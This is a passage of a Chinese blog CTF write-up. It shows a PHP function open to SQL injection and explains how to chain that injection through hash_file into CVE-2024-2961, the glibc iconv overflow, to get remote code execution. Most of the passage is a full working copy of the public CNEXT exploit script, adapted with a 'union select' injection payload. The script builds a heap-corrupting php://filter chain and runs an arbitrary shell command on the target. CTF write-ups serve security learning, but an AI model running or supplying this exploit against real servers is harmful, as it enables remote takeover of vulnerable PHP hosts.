+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$curl </span>= <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$tmpInfo </span>= <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tmpInfo</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_filename</span>(<span class="params"><span class="variable">$len</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$chars </span>= <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">    <span class="variable">$var_size </span>= <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="variable">$res </span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>( <span class="variable">$x </span>= <span class="number">0</span>; <span class="variable">$x </span>&lt; <span class="variable">$len</span>; <span class="variable">$x</span>++ ) &#123;</span><br><span class="line">        <span class="variable">$random_str</span>= <span class="variable">$chars</span>[ <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="variable">$var_size </span>- <span class="number">1</span> ) ];</span><br><span class="line">        <span class="variable">$res </span>.= <span class="variable">$random_str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$res </span>= <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>). <span class="string">&#x27;_&#x27;</span> . <span class="variable">$res </span>. <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$conn </span>, <span class="variable">$filename</span>, <span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql </span>= <span class="string">&quot;SELECT filename from data where url = &#x27;<span class="subst">$url</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result </span>= <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="variable">$row </span>= <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>( <span class="variable">$row as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>( <span class="title function_ invoke__">hash_file</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$filename</span>) === <span class="title function_ invoke__">hash_file</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$value</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结合提示可以得到应该是<code>hash_file</code>的猫腻。结合任意文件读取+<code>hash_file</code>，可以想到是通过glibc溢出漏洞来rce：</p>
+<img src="/posts/undefined/24.png" class title="awa">
+<p>这里有两个<code>hash_file</code>函数，其中第一个<code>hash_file('md5', $filename)</code>，这个filename是<code>$filename = $baseDir .  get_filename(8);</code>，结合<code>get_filename()</code>函数，可以得知左边这个<code>hash_file</code>是写死的。</p>
+<p>右边的<code>$value[0]</code>则是通过sql查询的结果，这里sql查询只是一个简单的查询语句，没有做任何的防御。结合<code>$value[0]</code>，这里需要通过sql注入来读取该文件，利用sql注入<code>select 'file://localhost/xxx'</code>会返回<code>file://localhost/xxx</code>这个字符串，从而进行<code>glibc</code>溢出攻击，简单修改现成的python脚本即可。</p>
+<p><a target="_blank" rel="noopener" href="http://exp.py">exp.py</a>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure>
+<pre><code>Tweak it to fit your target, and start the exploit.
+&quot;&quot;&quot;
+
+def __init__(self, url: str) -&gt; None:
+    self.url = url
+    self.session = Session()
+
+def send(self, path: str) -&gt; Response:
+    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
+    &quot;&quot;&quot;
+    
+    #这里的post的参数名需要根据实际更改
+    
+    return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;)
+    
+def download(self, path: str) -&gt; bytes:
+    &quot;&quot;&quot;Returns the contents of a remote file.
+    &quot;&quot;&quot;
+    
+    #这里的path读文件也是需要根据实际需要更改
+    #path = f&quot;file://localhost/&#123;path&#125;&quot;
+    
+    #path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    path = f&quot;file://localhost/&#123;path&#125;&quot;
+    response = self.send(path)
+    #这里返回的data也是根据实际情况来查找页面内容，最好是自己先尝试读取/proc/self/maps后根据得到的内容进行提取
+    #data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)
+    #return base64.decode(data)
+    return response.content
+</code></pre>
+<p>@entry<br>
+@arg(“url”, “Target URL”)<br>
+@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>
+@arg(“sleep_time”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>
+@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>
+@arg(<br>
+“pad”,<br>
+“Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;<br>
+“operations with this size, increase this. Defaults to 20.”,<br>
+)<br>
+@dataclass<br>
+class Exploit:<br>
+“”“CNEXT exploit: RCE using a file read primitive in PHP.””&quot;</p>
+<pre><code>url: str
+command: str
+sleep: int = 1
+heap: str = None
+pad: int = 20
+
+def __post_init__(self):
+    self.remote = Remote(self.url)
+    self.log = logger(&quot;EXPLOIT&quot;)
+    self.info = &#123;&#125;
+    self.heap = self.heap and int(self.heap, 16)
+
+def check_vulnerable(self) -&gt; None:
+    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
+    wrappers and filters that the exploit needs.
+    &quot;&quot;&quot;
+    
+    def safe_download(path: str) -&gt; bytes:
+        try:
+            return self.remote.download(path)
+        except ConnectionError:
+            failure(&quot;Target not [b]reachable[/] ?&quot;)
+        
+
+    def check_token(text: str, path: str) -&gt; bool:
+        result = safe_download(path)
+        return text.encode() == result
+
+    text = tf.random.string(50).encode()
+    base64 = b64(text, misalign=True).decode()
+    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;
+    
+    result = safe_download(path)
+    
+    if text not in result:
+        msg_failure(&quot;Remote.download did not return the test string&quot;)
+        print(&quot;--------------------&quot;)
+        print(f&quot;Expected test string: &#123;text&#125;&quot;)
+        print(f&quot;Got: &#123;result&#125;&quot;)
+        print(&quot;--------------------&quot;)
+        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]data://[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(text.encode(), misalign=True).decode()
+    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
+    if not check_token(text, path):
+        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(compress(text.encode()), misalign=True).decode()
+    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;
+
+    if not check_token(text, path):
+        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)
+
+    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)
+
+    msg_success(&quot;Exploit preconditions are satisfied&quot;)
+
+def get_file(self, path: str) -&gt; bytes:
+    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
+        return self.remote.download(path)
+
+def get_regions(self) -&gt; list[Region]:
+    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
+    maps = self.get_file(&quot;/proc/self/maps&quot;)
+    maps = maps.decode()
+    PATTERN = re.compile(
+        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
+    )
+    regions = []
+    for region in table.split(maps, strip=True):
+        if match := PATTERN.match(region):
+            start = int(match.group(1), 16)
+            stop = int(match.group(2), 16)
+            permissions = match.group(3)
+            path = match.group(4)
+            if &quot;/&quot; in path or &quot;[&quot; in path:
+                path = path.rsplit(&quot; &quot;, 1)[-1]
+            else:
+                path = &quot;&quot;
+            current = Region(start, stop, permissions, path)
+            regions.append(current)
+        else:
+            print(maps)
+            failure(&quot;Unable to parse memory mappings&quot;)
+
+    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)
+
+    return regions
+
+def get_symbols_and_addresses(self) -&gt; None:
+    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
+    regions = self.get_regions()
+
+    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;
+
+    # PHP's heap
+
+    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)
+
+    # Libc
+
+    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)
+
+    self.download_file(libc.path, LIBC_FILE)
+
+    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
+    self.info[&quot;libc&quot;].address = libc.start
+
+def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
+    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
+    for region in regions:
+        if any(name in region.path for name in names):
+            break
+    else:
+        failure(&quot;Unable to locate region&quot;)
+
+    return region
+
+def download_file(self, remote_path: str, local_path: str) -&gt; None:
+    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
+    data = self.get_file(remote_path)
+    Path(local_path).write(data)
+
+def find_main_heap(self, regions: list[Region]) -&gt; Region:
+    # Any anonymous RW region with a size superior to the base heap size is a
+    # candidate. The heap is at the bottom of the region.
+    heaps = [
+        region.stop - HEAP_SIZE + 0x40
+        for region in reversed(regions)
+        if region.permissions == &quot;rw-p&quot;
+        and region.size &gt;= HEAP_SIZE
+        and region.stop &amp; (HEAP_SIZE-1) == 0
+        and region.path == &quot;&quot;
+    ]
+
+    if not heaps:
+        failure(&quot;Unable to find PHP's main heap in memory&quot;)
+
+    first = heaps[0]
+
+    if len(heaps) &gt; 1:
+        heaps = &quot;, &quot;.join(map(hex, heaps))
+        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
+    else:
+        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)
+
+    return first
+
+def run(self) -&gt; None:
+    self.check_vulnerable()
+    self.get_symbols_and_addresses()
+    self.exploit()
+
+def build_exploit_path(self) -&gt; str:
+    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the
+    other. Processing generally involves making some kind of operation either
+    on the chunk or in a destination chunk of the same size. Each operation is
+    applied on every single chunk; you cannot make PHP apply iconv on the first 10
+    chunks and leave the rest in place. That's where the difficulties come from.
+
+    Keep in mind that we know the address of the main heap, and the libraries.
+    ASLR/PIE do not matter here.
+
+    The idea is to use the bug to make the freelist for chunks of size 0x100 point
+    lower. For instance, we have the following free list:
+
+    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00
+
+    By triggering the bug from chunk ..900, we get:
+
+    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???
+
+    That's step 3.
+
+    Now, in order to control the free list, and make it point whereever we want,
+    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
+    we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
+    That's step 2.
+
+    Now, if we were to perform step2 an then step3 without anything else, we'd have
+    a problem: after step2 has been processed, the free list goes bottom-up, like:
+
+    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900
+
+    We need to go the other way around. That's why we have step 1: it just allocates
+    chunks. When they get freed, they reverse the free list. Now step2 allocates in
+    reverse order, and therefore after step2, chunks are in the correct order.
+
+    Another problem comes up.
+
+    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
+    Since step2 creates chunks that contain pointers and pointers are generally not
+    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
+    To avoid this, we put the chunks in step2 at the very end of the chain, and
+    prefix them with `0\n`. When dechunked (right before the iconv), they will
+    &quot;disappear&quot; from the chain, preserving them from the character set conversion
+    and saving us from an unwanted processing error that would stop the processing
+    chain.
+
+    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
+    don't know the precise layout of the heap, but we know that at the top of the
+    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
+    Its free_slot[] array contains a pointer to each free list. By overwriting it,
+    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
+    field contains pointers to hook functions for emalloc, efree, and erealloc
+    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
+    then overwrite the use_custom_heap flag to make PHP use these function pointers
+    instead. We can now do our favorite CTF technique and get a call to
+    system(&lt;chunk&gt;).
+    We make sure that the &quot;system&quot; command kills the current process to avoid other
+    system() calls with random chunk data, leading to undefined behaviour.
+
+    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
+    process is in a random state, we still get contiguous, in order chunks for our
+    exploit.
+
+    Therefore, the whole process described here CANNOT crash. Everything falls
+    perfectly in place, and nothing can get in the middle of our allocations.
+    &quot;&quot;&quot;
+
+    LIBC = self.info[&quot;libc&quot;]
+    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
+    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
+    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]
+
+    ADDR_HEAP = self.info[&quot;heap&quot;]
+    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
+    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
+
+    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+
+    CS = 0x100
+
+    # Pad needs to stay at size 0x100 at every step
+    pad_size = CS - 0x18
+    pad = b&quot;\x00&quot; * pad_size
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = compressed_bucket(pad)
+
+    step1_size = 1
+    step1 = b&quot;\x00&quot; * step1_size
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1, CS)
+    step1 = compressed_bucket(step1)
+
+    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
+    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;
+
+    step2_size = 0x48
+    step2 = b&quot;\x00&quot; * (step2_size + 8)
+    step2 = chunked_chunk(step2, CS)
+    step2 = chunked_chunk(step2)
+    step2 = compressed_bucket(step2)
+
+    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
+    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+    step2_write_ptr = chunked_chunk(step2_write_ptr)
+    step2_write_ptr = compressed_bucket(step2_write_ptr)
+
+    step3_size = CS
+
+    step3 = b&quot;\x00&quot; * step3_size
+    assert len(step3) == CS
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = compressed_bucket(step3)
+
+    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
+    assert len(step3_overflow) == CS
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = compressed_bucket(step3_overflow)
+
+    step4_size = CS
+    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = compressed_bucket(step4)
+
+    # This chunk will eventually overwrite mm_heap-&gt;free_slot
+    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
+    step4_pwn = ptr_bucket(
+        0x200000,
+        0,
+        # free_slot
+        0,
+        0,
+        ADDR_CUSTOM_HEAP,  # 0x18
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        ADDR_HEAP,  # 0x140
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        size=CS,
+    )
+
+    step4_custom_heap = ptr_bucket(
+        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+    )
+
+    step4_use_custom_heap_size = 0x140
+
+    COMMAND = self.command
+    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
+    if self.sleep:
+        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
+    COMMAND = COMMAND.encode() + b&quot;\x00&quot;
+
+    assert (
+        len(COMMAND) &lt;= step4_use_custom_heap_size
+    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
+    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)
+
+    step4_use_custom_heap = COMMAND
+    step4_use_custom_heap = qpe(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+
+    pages = (
+        step4 * 3
+        + step4_pwn
+        + step4_custom_heap
+        + step4_use_custom_heap
+        + step3_overflow
+        + pad * self.pad
+        + step1 * 3
+        + step2_write_ptr
+        + step2 * 2
+    )
+
+    resource = compress(compress(pages))
+    resource = b64(resource)
+    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;
+
+    filters = [
+        # Create buckets
+        &quot;zlib.inflate&quot;,
+        &quot;zlib.inflate&quot;,
+        
+        # Step 0: Setup heap
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+        
+        # Step 1: Reverse FL order
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+        
+        # Step 2: Put fake pointer and make FL order back to normal
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+        
+        # Step 3: Trigger overflow
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
+        
+        # Step 4: Allocate at arbitrary address and change zend_mm_heap
+        &quot;convert.quoted-printable-decode&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+    ]
+    filters = &quot;|&quot;.join(filters)
+    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;
+
+    return path
+
+@inform(&quot;Triggering...&quot;)
+def exploit(self) -&gt; None:
+    path = self.build_exploit_path()
+    start = time.time()
+
+    try:
+        #这里的path根据需要进行修改触发
+        self.remote.send(&quot;123123' union select '&quot; +path+ &quot;'--&quot;)
+    except (ConnectionError, ChunkedEncodingError):
+        pass
+    
+    msg_print()
+    
+    if not self.sleep:
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
+    elif start + self.sleep &lt;= time.time():
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
+    else:
+        # Wrong heap, maybe? If the exploited suggested others, use them!
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)
+    
+    msg_print()
+</code></pre>
+<p>def compress(data) -&gt; bytes:<br>
+“”“Returns data suitable for <code>zlib.inflate</code>.<br>
+“””<br>
+# Remove 2-byte header and 4-byte checksum<br>
+return zlib.compress(data, 9)[2:-4]</p>
+<p>def b64(data: bytes, misalign=True) -&gt; bytes:<br>
+payload = base64.encode(data)<br>
+if not misalign and payload.endswith(“=”):<br>
+raise ValueError(f&quot;Misaligned: {data}&quot;)<br>
+return payload.encode()</p>
+<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>
+“”“Returns a chunk of size 0x8000 that, when dechunked, returns the data.”“”<br>
+return chunked_chunk(data, 0x8000)</p>
+<p>def qpe(data: bytes) -&gt; bytes:<br>
+“”“Emulates quoted-printable-encode.<br>
+“””<br>
+return “”.join(f&quot;={x:02x}&quot; for x in data).upper().encode()</p>
+<p>def ptr_bucket(*ptrs, size=None) -&gt; bytes:<br>
+“”“Creates a 0x8000 chunk that reveals pointers after every step has been ran.”“”<br>
+if size is not None:<br>
+assert len(ptrs) * 8 == size<br>
+bucket = b&quot;&quot;.join(map(p64, ptrs))<br>
+bucket = qpe(bucket)<br>
+bucket = chunked_chunk(bucket)<br>
+bucket = chunked_chunk(bucket)<br>
+bucket = chunked_chunk(bucket)<br>
+bucket = compressed_bucket(bucket)</p>
+<pre><code>return bucket
+</code></pre>
+<p>def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:<br>
+“”“Constructs a chunked representation of the given chunk. If size is given, the<br>
+chunked representation has size <code>size</code>.<br>
+For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>
+“””<br>
+# The caller does not care about the size: let’s just add 8, which is more than<br>
+# enough<br>
+if size is None:<br>
+size = len(data) + 8<br>
+keep = len(data) + len(b&quot;\n\n&quot;)<br>
+size = f&quot;{len(data):x}“.rjust(size - keep, “0”)<br>
+return size.encode() + b”\n&quot; + data + b&quot;\n&quot;</p>
+<p>@dataclass<br>
+class Region:<br>
+“”“A memory region.”“”</p>
+<pre><code>start: int
+stop: int
+permissions: str
+path: str
+
+@property
+def size(self) -&gt; int:
+    return self.stop - self.start
+</code></pre>
+<p>Exploit()</p>
+<pre class="highlight"><code class>
+</code></pre>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/3830.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
